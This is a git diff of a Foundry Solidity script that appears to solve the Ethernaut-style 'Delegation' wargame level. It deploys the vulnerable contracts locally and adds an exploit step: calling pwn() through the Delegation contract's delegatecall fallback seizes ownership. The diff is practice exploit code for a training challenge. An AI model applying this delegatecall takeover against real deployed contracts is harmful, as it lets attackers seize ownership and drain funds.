@@ -20,7 +20,7 @@ contract DelegationScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Delegation(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Delegation(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +32,8 @@ contract DelegationScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Delegation();
+            Delegate delegate = new Delegate(deployer);
+            target = new Delegation(address(delegate));
             vm.stopBroadcast();
         }
     }
@@ -44,5 +45,10 @@ contract DelegationScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+
+        console.log("[Exploit]");
+        vm.broadcast(attacker);
+        Delegate(address(target)).pwn();
+        console.log("owner : %s", target.owner());
     }
 }
